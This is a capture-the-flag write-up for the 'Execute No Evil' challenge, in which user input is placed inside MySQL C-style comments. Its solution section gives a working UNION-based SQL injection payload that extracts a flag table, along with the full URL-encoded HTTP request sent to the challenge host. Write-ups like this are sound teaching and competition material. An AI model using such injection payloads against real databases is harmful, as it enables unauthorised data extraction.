# Execute No Evil
## Challenge:
>(1) New Message: "Hey dude. So we have this database system at work and I just found an SQL injection point. I quickly fixed it by commenting out all the user input in the query. Don't worry, I made the query so that it responds with boss's profile, since he is kind of the only person actively using this database system, and he always looks up his own name, lol. Anyway, guess we'll go with this til' the sysadmin comes and fixes the issue."
>
>Huh, so hear no evil, see no evil, ... execute no evil?

## Vulnerability
>MySQL C-Style comments - https://dev.mysql.com/doc/refman/5.7/en/comments.html

## Solution
SQL:
```sql
! 'Geronimo' UNION ALL SELECT 1,name,(Select whatsthis fRoM flag) FROM users WHERE name=
```

HTTP Request
```HTTP
GET /?name=%21+%27Geronimo%27+UNION+ALL+SELECT+1%2Cname%2C%28Select+whatsthis+fRoM+flag%29+FROM+users+WHERE+name%3D HTTP/1.1

Host: challs.xmas.htsp.ro:11002

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1
```
